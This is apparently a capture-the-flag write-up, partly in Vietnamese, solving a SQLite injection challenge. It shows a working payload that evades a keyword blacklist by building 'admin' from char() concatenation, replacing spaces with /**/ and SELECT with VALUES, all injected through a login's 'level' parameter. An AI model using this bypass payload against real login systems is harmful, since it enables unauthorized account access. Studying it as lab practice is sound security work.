# Discription:

You cannot create the query because we have blocked the following keywords. Challenge you to bypass it, how to know after each SQL Keyword you will be used what SQL statement. The blacklist sqli_filter = '[', ']', ',', 'admin', 'select', ''', '"', '\t', '\n', '\r', '\x08', '\x09', '\x00', '\x0b', '\x0d', ' '.

The vulnerable parameter is 'level' in Login function.

Goodluck guys (｀∀´)Ψ

# Solutions:

= Bởi đây là SQLite, với đề bài là block admin,...

=> Phải biến admin thành các chuỗi nối nhau.

= Trong Sqlite, nối chuối dùng || || :

`SELECT 'Anh'||' '||'Em';`

=> Anh Em 

=> admin chính là `char(97)||char(100)||char(109)||char(105)||char(110)`

= Lưu ý // = /****/

= Khi đăng nhập `username` là a, `password` là a thì thu được:

<img width="436" height="367" alt="image" src="https://github.com/user-attachments/assets/d1173b7e-3057-438d-ad4e-160037221e0b" />

= Trong SQLite, VALUES có thể thay thế SELECT để trả về dữ liệu. Và gắn liền với VALUES là các `level`:

Ví dụ: 
```
VALUES(1,'Alice')
UNION
VALUES(2,'Bob');
```

=> Lúc này ta có 2 level là 1,2.

= Bài này thử test từ level1:

```
SELECT uid FROM users WHERE uid=‘{uid}’ and upw=‘{upw}’ and level=1/**/union/**/values/**/(char(97)||char(100)||char(109)||char(105)||char(110))
```

=> Vậy ngay `level1` ta đã thu được flag :>
<img width="915" height="409" alt="image" src="https://github.com/user-attachments/assets/def04a8a-4de5-41bf-b026-a414e8c01a7e" />
